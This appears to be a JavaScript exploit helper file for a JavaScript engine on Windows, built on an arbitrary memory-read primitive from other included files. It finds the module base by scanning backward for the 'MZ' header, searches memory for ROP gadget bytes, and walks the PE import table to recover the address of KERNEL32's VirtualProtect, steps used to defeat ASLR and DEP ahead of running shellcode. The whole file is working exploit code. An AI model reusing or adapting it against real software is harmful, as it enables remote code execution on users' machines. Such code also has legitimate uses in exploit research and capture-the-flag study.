load("../exp-tools/utils.js")
load("../exp-tools/int64.js")

function leak_js_base(leak_pointer){
    let js_page = alignDownPage(leak_pointer);

    /*  [+] enum all page to find base */
    while(true){
        //let magic_value = "MZ";
        let value = real_read_qword(js_page);   
        let bytes = value.bytes();
        let magic = String.fromCharCode(bytes[0], bytes[1]);
        if(magic == "MZ")
            break;
        js_page = Sub(js_page, 0x1000);

    }

    return js_page;
}

function leak_rop_chain_addr(base_addr, magic_value){
    let rop_addr = base_addr;

    for(; ; rop_addr = Add(rop_addr, 0x2)){
        let value = real_read_qword(rop_addr).bytes(0, 7);
        value[7] = 0;

        if(Eq(value, magic_value)){
            break;
        }
    }
    return rop_addr;
}

function leak_vp_function(js_base){
    /*  [+] First we need to leak the IAT table */
    let e_lfanew = real_read_dword( Add(js_base, 0x3C));

    /* 
    *   [+] 0:008> dt ntdll!_IMAGE_DOS_HEADER 00007ff7`a3560000
            +0x000 e_magic          : 0x5a4d
            +0x002 e_cblp           : 0x78
            +0x004 e_cp             : 1
            +0x006 e_crlc           : 0
            +0x008 e_cparhdr        : 4
            +0x00a e_minalloc       : 0
            +0x00c e_maxalloc       : 0
            +0x00e e_ss             : 0
            +0x010 e_sp             : 0
            +0x012 e_csum           : 0
            +0x014 e_ip             : 0
            +0x016 e_cs             : 0
            +0x018 e_lfarlc         : 0x40
            +0x01a e_ovno           : 0
            +0x01c e_res            : [4] 0
            +0x024 e_oemid          : 0
            +0x026 e_oeminfo        : 0
            +0x028 e_res2           : [10] 0
            +0x03c e_lfanew         : 0n120 --> hex(120) = 0x78
    */
    print("[+] e_lfanew: " + e_lfanew);
    /*  
    *   dt ntdll!_IMAGE_NT_HEADERS64 00007ff7`a3560000+78
    *       +0x000 Signature        : 0x4550
    *       +0x004 FileHeader       : _IMAGE_FILE_HEADER
    *       +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER64
    */
    let IMAGE_NT_HEADERS32_ADDR = Add(js_base, e_lfanew); 
    let _IMAGE_OPTIONAL_HEADER64 = Add(IMAGE_NT_HEADERS32_ADDR, 0x18);

    print("[+] _IMAGE_OPTIONAL_HEADER64: " + _IMAGE_OPTIONAL_HEADER64);

    /*  [+] Now we could find the IAT Table */
    let IAT_TABLE_DICT =  Add(_IMAGE_OPTIONAL_HEADER64, 0x70 + (1 * 0x8));

    let IAT_RVA = real_read_dword(IAT_TABLE_DICT);
    print("[+] IAT_RVA: " + IAT_RVA);
    let IAT_TABLE_ADDRESS = Add(js_base, IAT_RVA);
    print("[+] IAT_TABLE_ADDRESS: " + IAT_TABLE_ADDRESS);

    let INT_ADDRESS = 0;
    let IAT_ADDRESS = 0;

    for(let i = 0; i < 0x20; i++){
        let read_addr = Add(IAT_TABLE_ADDRESS, ( 3 + 5 * i) * 0x4);
        let value_offset = real_read_dword(read_addr);
        //print("[+] value offset: " + value_offset);
        let dll_name = real_read_qword(Add(js_base, value_offset));
        let bytess = dll_name.bytes();
        let mark_dll = "KERNEL3";
        print("[+] dll name: " + dll_name);
        let IAT_DLL_NAME = String.fromCharCode(  bytess[1], bytess[2], bytess[3], bytess[4], bytess[5], bytess[6], bytess[7] );
        print("[+] IAT_DLL_NAME: " + IAT_DLL_NAME);
        print("[+] be here: ");
        if(mark_dll == IAT_DLL_NAME){
            print("[+] HIHIHI: " + read_addr);
            INT_ADDRESS = Add(js_base, real_read_dword( Sub(read_addr, 0x4 * 3)));
            IAT_ADDRESS = Add(js_base, real_read_dword( Add(read_addr, 0x4)));
            print("[+] INT_TABLE_ADDRESS : " + INT_ADDRESS);
            print("[+] IAT_TABLE_ADDRESS : " + IAT_ADDRESS);
            /*
            *   [+] To find the index by name
            */
            for(let i = 0; i < 0x100; i++){
                let func_name_rva = real_read_dword(Add(INT_ADDRESS, i * 8));
                //print("[+] func_name_rva: " + func_name_rva);
                let func_name = real_read_qword( Add(js_base, func_name_rva));
                let func_name_next = real_read_qword( Add(8, Add(js_base, func_name_rva)));
                let f_bye = func_name.bytes();
                let fn_bye = func_name_next.bytes();
                func_name = String.fromCharCode(f_bye[1], f_bye[2], f_bye[3], f_bye[4], f_bye[5], f_bye[6], f_bye[7]);
                func_name_next = String.fromCharCode(fn_bye[1], fn_bye[2], fn_bye[3], fn_bye[4], fn_bye[5], fn_bye[6], fn_bye[7]);
                let find_name = func_name + func_name_next +  "";
                //"VirtuaProtect"
                let mark_name = "Virtua";
                let flag = (find_name[1] == 'V') && find_name[2] == 'i' && find_name[7] == 'P';
                //print("[+] flag: " + flag);
                if(flag) 
                {
                    print("[+] func_name: " +  find_name + " " + i);
                    print("[+] vp_func saved at here: " + Add(IAT_ADDRESS, i * 8));
                    let vp_addr = real_read_qword( Add(IAT_ADDRESS, i * 8));
                    print("[+] VirtualProtect function addr at: " + vp_addr);
                    /*  [+] Now we need to return the address */
                    return vp_addr;
                }
            }
            break;
        }

    }
}